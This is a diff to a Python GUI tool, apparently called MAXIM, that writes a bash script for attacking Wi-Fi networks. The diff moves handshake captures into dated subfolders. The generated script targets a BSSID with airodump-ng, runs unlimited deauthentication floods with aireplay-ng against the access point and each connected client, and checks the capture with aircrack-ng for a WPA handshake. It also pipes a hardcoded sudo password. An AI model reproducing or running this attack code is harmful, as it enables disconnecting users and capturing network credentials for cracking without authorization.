@@ -1204,7 +1204,8 @@ class MaximWindow(QMainWindow):
         out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
         safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
         essid_dir = f"{out_dir}/{safe_essid}"
-        capture_prefix = f"{essid_dir}/{safe_essid}"
+        # capture_prefix is set inside the script as $CAPTURE_DIR/safe_essid
+        capture_prefix_var = f"$CAPTURE_DIR/{safe_essid}"
         signal_file = self._HS_SIGNAL_FILE
 
         self._term_write(f"\n{'═'*60}")
@@ -1228,10 +1229,11 @@ class MaximWindow(QMainWindow):
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
-        script.write(f"mkdir -p '{essid_dir}'\n")
-        script.write(f"rm -f '{signal_file}'\n")
-        script.write(f"# Clean old capture files so we don't pick up stale handshakes\n")
-        script.write(f"rm -f '{capture_prefix}'-*.cap '{capture_prefix}'-*.csv '{capture_prefix}'-*.pcap 2>/dev/null\n\n")
+        script.write(f"# Create dated subfolder: ESSID/YYYY-MM-DD_HH-MM-SS/\n")
+        script.write(f"DATESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')\n")
+        script.write(f"CAPTURE_DIR='{essid_dir}/'$DATESTAMP\n")
+        script.write(f"mkdir -p \"$CAPTURE_DIR\"\n")
+        script.write(f"rm -f '{signal_file}'\n\n")
 
         # SAFETY GUARD: protect the managed adapter — abort if anything tries to touch it
         if keep_iface:
@@ -1355,7 +1357,7 @@ class MaximWindow(QMainWindow):
         script.write("sleep 1\n")
 
         # Start airodump in background
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface} &>/dev/null &\n")
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w \"$CAPTURE_DIR/{safe_essid}\" --output-format pcap,csv {iface} &>/dev/null &\n")
         script.write("AIRODUMP_PID=$!\n")
         script.write("sleep 2\n\n")
 
@@ -1366,7 +1368,7 @@ class MaximWindow(QMainWindow):
         script.write(f"  sudo aireplay-ng --deauth 0 -a $BSSID {iface} &>/dev/null &\n")
         script.write("  DEAUTH_MAIN=$!\n")
         # Per-client targeted deauth in parallel
-        script.write(f"  CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
+        script.write(f"  CAP_CSV=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.csv 2>/dev/null | head -1)\n")
         script.write("  if [ -n \"$CAP_CSV\" ]; then\n")
         script.write("    for STA in $(grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"^$BSSID\" | grep -i \"$BSSID\" | cut -d, -f1 | tr -d ' ' | sort -u); do\n")
         script.write(f"      sudo aireplay-ng --deauth 0 -a $BSSID -c $STA {iface} &>/dev/null &\n")
@@ -1384,7 +1386,7 @@ class MaximWindow(QMainWindow):
         script.write("  sudo pkill -f 'mdk4' 2>/dev/null\n")
         script.write("  sleep 1\n")
         # Check for handshake
-        script.write(f"  CAP_FILE=$(ls -t '{capture_prefix}'-*.cap 2>/dev/null | head -1)\n")
+        script.write(f"  CAP_FILE=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.cap 2>/dev/null | head -1)\n")
         script.write("  if [ -n \"$CAP_FILE\" ]; then\n")
         script.write("    # Verify handshake exists AND matches our target BSSID\n")
         script.write("    if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -i \"$BSSID\" | grep -qE '[1-9][0-9]* handshake'; then\n")
